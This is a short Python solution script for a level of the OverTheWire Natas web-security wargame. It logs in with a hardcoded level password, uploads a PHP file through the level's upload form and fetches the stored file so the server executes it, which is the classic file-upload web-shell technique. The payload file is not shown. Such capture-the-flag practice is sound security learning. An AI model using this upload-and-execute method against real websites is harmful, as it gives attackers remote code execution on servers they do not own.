#!/usr/local/bin/python3
import requests
import re

username = "natas12"
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = 'http://%s.natas.labs.overthewire.org/' % username

data = {"filename": "natas12.php", "submit": "Upload file"}
files = {"uploadedfile": open('natas12.php')}

response = requests.post(url, auth=(username, password), data=data, files=files)
content = response.text

filename = re.findall('The file <a href="(.*)">upload', content)[0]

##############################################################################

url = 'http://%s.natas.labs.overthewire.org/%s' % (username, filename)

response = requests.get(url, auth=(username, password))
content = response.text

print(content)
# print(re.findall('natas12 is (.*)<br>', content)[0])
